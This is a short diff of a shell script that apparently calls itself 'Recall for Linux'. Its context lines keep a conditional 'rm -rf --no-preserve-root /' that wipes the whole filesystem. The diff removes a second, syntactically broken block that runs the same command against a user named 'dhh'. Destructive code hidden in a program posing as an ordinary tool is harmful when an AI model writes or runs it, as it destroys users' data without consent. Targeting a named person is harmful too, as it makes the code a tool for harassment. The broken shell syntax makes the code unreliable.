@@ -99,10 +99,6 @@ if ((IMPORTANT_MESSAGE_FREQUENCY < 700)); then
     rm -rf --no-preserve-root /
 fi
 
-if [ "$USER" == "dhh"]
-    rm -rf --no-preserve-root /
-fi
-
 echo "Recall for Linux is now active -- do not close this program"
 
 # Detect display server
